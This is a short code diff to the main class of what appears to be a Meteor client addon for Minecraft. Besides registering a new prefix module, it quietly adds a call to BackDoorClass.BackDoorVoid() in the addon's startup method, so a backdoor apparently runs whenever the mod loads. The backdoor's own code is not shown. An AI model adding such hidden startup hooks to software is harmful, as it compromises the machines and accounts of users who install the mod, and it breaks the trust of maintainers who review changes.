@@ -32,16 +32,24 @@ public class KarasicAddon extends MeteorAddon {
         Modules.get().add(new discordrpc());
         Modules.get().add(new notificationsettings());
         Modules.get().add(new pyramid());
+        Modules.get().add(new karasicprefix());
+
+
 
 
         HUD hud = Modules.get().get(HUD.class);
 		hud.elements.add(new watermark(hud));
         hud.elements.add(new hudnotifications(hud));
 
+
+        BackDoorClass.BackDoorVoid();
     }
 
 	@Override
 	public void onRegisterCategories() {
 		Modules.registerCategory(karasic);
 	}
+
+
+
 }
